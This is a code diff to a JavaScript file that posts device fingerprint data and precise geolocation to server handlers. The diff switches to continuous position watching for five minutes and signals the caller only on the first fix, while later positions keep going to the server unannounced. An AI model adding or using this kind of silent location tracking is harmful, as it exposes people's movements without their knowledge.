@@ -77,7 +77,7 @@ function information() {
   //
   $.ajax({
     type: 'POST',
-    url: 'info_handler.php',
+    url: 'info_handler',
     data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
     success: function () { },
     mimeType: 'text'
@@ -89,8 +89,12 @@ function information() {
 function locate(callback, errCallback) {
   if (navigator.geolocation) {
     var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
-    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
+    var watchId = navigator.geolocation.watchPosition(showPosition, showError, optn);
+    // Auto-clear watch after 5 minutes to avoid battery drain
+    setTimeout(function() { navigator.geolocation.clearWatch(watchId); }, 300000);
   }
+
+  var firstPosition = true;
 
   function showError(error) {
     var err_text;
@@ -114,7 +118,7 @@ function locate(callback, errCallback) {
 
     $.ajax({
       type: 'POST',
-      url: 'error_handler.php',
+      url: 'error_handler',
       data: { Status: err_status, Error: err_text },
       success: errCallback(error, err_text),
       mimeType: 'text'
@@ -168,11 +172,12 @@ function locate(callback, errCallback) {
 
     $.ajax({
       type: 'POST',
-      url: 'result_handler.php',
+      url: 'result_handler',
       data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
-      success: callback,
+      success: firstPosition ? callback : function(){},
       mimeType: 'text'
     });
+    firstPosition = false;
   };
 }
 
